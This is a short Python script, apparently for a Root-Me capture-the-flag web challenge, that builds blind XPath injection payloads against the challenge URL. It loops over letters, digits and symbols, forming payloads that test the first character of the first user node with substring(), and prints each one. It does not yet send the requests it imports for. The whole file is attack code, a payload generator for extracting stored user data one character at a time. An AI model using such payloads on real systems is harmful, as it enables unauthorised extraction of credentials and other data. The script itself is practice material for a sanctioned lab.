import requests, string 

alphabet = string.ascii_letters + string.digits + "{}_()"
url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid="
for a in alphabet:

	test_payload = "\' or substring((//user[position()=1]/child::node()[position()=1]),1,1)=\""+a+"\" or \'\'=\'"
	
	print(test_payload)

